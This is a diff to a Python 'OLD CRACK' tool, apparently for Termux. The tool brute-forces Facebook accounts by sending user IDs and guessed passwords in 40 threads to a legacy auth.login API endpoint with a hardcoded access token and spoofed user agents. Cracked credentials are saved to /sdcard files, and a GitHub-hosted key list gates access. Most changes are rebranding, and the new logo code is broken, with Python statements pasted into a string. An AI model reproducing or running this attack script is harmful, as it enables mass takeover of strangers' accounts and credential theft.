@@ -15,7 +15,7 @@ except:
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 #-----------------------------[LINE]-----------------------------------#
 def lin():
-	print("\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+	print("\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 #----------------------------[DATE]-----------------------------------#
 dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
 dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
@@ -36,7 +36,7 @@ else:
 A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
 #----------------------------[USER/AGENT]-----------------------------------#
 def ua():
-    ALI☠️random.randint
+    rr=random.randint
     aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     zA=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
     rx=random.randrange(1, 999)
@@ -45,27 +45,54 @@ def ua():
     xx=f"Mozilla/5.0 (Linux; Android 14; MI PAD 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6315.215 Mobile Safari/537.36"
     return xx
 #----------------------------[LOGO]-----------------------------------#
+logo = (f"""
+                                                                                                                                                                    
+cls()
+CLEAR_SCREEN = '\033[2J'
+RED = '\033[1;37;1m'  # mode 31 = red foreground
+RESET = '\033[1;37;1m'  # mode 0  = reset
+BLUE = "\033[1;37;1m"
+khushi = "NADEEM"
+WHITE = "\033[1;37;1m",
+YELLOW = "\033[1;37;1m",
+CYAN = "\033[1;37;1m"
+MAGENTA = "\033[1;37;1m",
+GREEN = "\033[1;37;1m"
+RESET = "\033[1;37;1m"
+BOLD = '\033[1;37;1m'
+REVERSE = "\033[1;37;1m"
 
 
-logo = (f"""                        
-\033[1;36m. ███    ██  █████  ██████  ███████ ███████ ███    ███      |
-\033[1;35m. ████   ██ ██   ██ ██   ██ ██      ██      ████  ████      |
-\033[1;34m. ██ ██  ██ ███████ ██   ██ █████   █████   ██ ████ ██      |  
-\033[1;33m. ██  ██ ██ ██   ██ ██   ██ ██      ██      ██  ██  ██      |
-\033[1;32m. ██   ████ ██   ██ ██████  ███████ ███████ ██      ██      |                                                                                                                                                                                                                                                                                                                         
-\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━━══━═━═━━══━═━━═━══━══━═━═━═
-\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92   NADEEM  ALI-☠️     [-VPN-MH PROXY-] 
-[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92m PARDHAN KIING         [-THE BARND-] 
-[\033[1;92m\033[1;34m✔\033[1;92m]TOOL           \033[1;91m\033[1;34m: \033[1;92m OLD CRACK-😀❣️      [-BROKEN-NADEEM-]
-[\033[1;92m\033[1;34m✔\033[1;92m]STATUS         \033[1;91m\033[1;34m: \033[1;92FREE TOOL 🌺
-[\033[1;92m\033[1;34m✔\033[1;92m]VERSION        \033[1;91m\033[1;34m: \033[1;35m[\033[1;32V.6\033[1;35m] THE PARDHAN     [-W/C NADEEN CMAND-]
-\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━━══━═━━━══━═━═━━════━═━═━═━═""")
-#----------------------------[MAIN/DEF]--------------------------------------------------------------------------#
+
+
+
+def logo():
+    clear = "\x1b[0m"
+    colors = [35, 33, 36]
+
+    x = """
+   
+
+\033[1;32m███╗   ██╗ █████╗ ██████╗ ███████╗███████╗███╗   ███╗
+\033[1;31m████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔════╝████╗ ████║
+\033[1;37m██╔██╗ ██║███████║██║  ██║█████╗  █████╗  ██╔████╔██║
+\033[1;31m██║╚██╗██║██╔══██║██║  ██║██╔══╝  ██╔══╝  ██║╚██╔╝██║
+\033[1;32m██║ ╚████║██║  ██║██████╔╝███████╗███████╗██║ ╚═╝ ██║
+\033[1;32m╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═╝
+                                                      
+\x1b[1;92m═━═━═━═━═━━═━═━══━═━══━═━━═━═━══━═━═━══━═━━═━═━══━═━═━══━═━━═━═━══━═━═━═━═━═━━═━═━══━═━═━═══━═━━═━═━══━═━═━═━═━═
+\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92   NADEEM ALI                              
+[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92m PARDHAN KIING                           
+[\033[1;92m\033[1;34m✔\033[1;92m]TOOL           \033[1;91m\033[1;34m: \033[1;92mOLD CRACK  DONE                      
+[\033[1;92m\033[1;34m✔\033[1;92m]STATUS         \033[1;91m\033[1;34m: \033[1;92FREE TOOL 
+[\033[1;92m\033[1;34m✔\033[1;92m]VERSION        \033[1;91m\033[1;34m: \033[1;35m[\033[1;32V.6\033[1;35m]                                  
+\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━━═━═━══━═━═━══━═━━═━═━══━═━═━══━═━━═━═━══━═━═━══━═━━═━═━══━═━═━══━═━━═━═━══━═━═━══━═━═━═━""")
+#----------------------------[MAIN/DEF]-----------------------------------#
 def main():
     user=[]
     os.system("clear")
     print(logo)
-    print(f'\x1b[38;5;8m\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \033[1;37mEXAMPLE   : \033[1;37m10000 | 20000 | 90000 [-CHOOSE LIMIT ID-] 🙏💔')
+    print(f'\x1b[38;5;8m\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \033[1;37mEXAMPLE   : \033[1;37m10000 | 20000 | 90000')
     lin()
     limit=input("\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mMATHOD   : ")
     lin()
@@ -88,8 +115,8 @@ def main():
     with ThreadPool(max_workers=40) as MrDevilEx:
         os.system('clear')
         print(logo)
-        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mTOTAL ID : {limit} \x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47m  METHOD : \x1b[38;5;86m{ask} KI ACCOUNT SELECTE KIYA')
-        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mIF NO RESULT \x1b[38;5;8m[\x1b[38;5;47mON\x1b[1;97m/\x1b[38;5;47mOF\x1b[38;5;8m]  \x1b[38;5;47mAIRPLANE MODE |-BROEN NADEEM-|')
+        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mTOTAL ID : {limit} \x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mMETHOD : \x1b[38;5;86m{ask}')
+        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mIF NO RESULT \x1b[38;5;8m[\x1b[38;5;47mON\x1b[1;97m/\x1b[38;5;47mOF\x1b[38;5;8m]  \x1b[38;5;47mAIRPLANE MODE')
         lin()
         for mal in user:
             uid=star+mal
@@ -114,17 +141,17 @@ def login(uid):
             "x-fb-http-engine": "Liger"}
             rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
             if "session_key" in rp:
-                print(f"\r\r{G}|-NADEEM OKY-|  {A}➤ {G}{uid} {A}•{G} {pw}")
+                print(f"\r\r{G}[-NADEEM OKY-]  {A}➤ {G}{uid} {A}•{G} {pw}")
                 open("/sdcard/NADEEM-OLD-OK","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break 
             elif "www.facebook.com" in rp["error_msg"]:
-                print(f"\r\r{G}|-NADEEM OKY-|  {A}➤ {G}{uid} {A}•{G} {pw}")
+                print(f"\r\r{G}[-NADEEM OKY-]  {A}➤ {G}{uid} {A}•{G} {pw}")
                 open("/sdcard/NADEEM-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             elif "Please Confirm Email" in str(rp):
-                print(f"\r\r{G}|-NADEEM-OKY-| {A}➤ {G}{uid} {A}•{G} {pw}")
+                print(f"\r\r{G}NADEEM-DONE {A}➤ {G}{uid} {A}•{G} {pw}")
                 open("/sdcard/NADEEM-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
@@ -136,7 +163,7 @@ def Subscraption():
 	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
 	clear()
 	print(logo)
-	r1=requests.get("https://raw.githubusercontent.com/WASUx/F-1/main/APPROVAL.txt").text
+	r1=requests.get("https://raw.githubusercontent.com/NADIMx/F-1/main/APPROVAL.txt").text
 	if key1 in r1:
 		os.system('clear')
 		print(logo)
@@ -171,3 +198,4 @@ def Subscraption():
 		Subscraption()        
 Subscraption()
 #----------------------------[CODE/END]-----------------------------------#
+
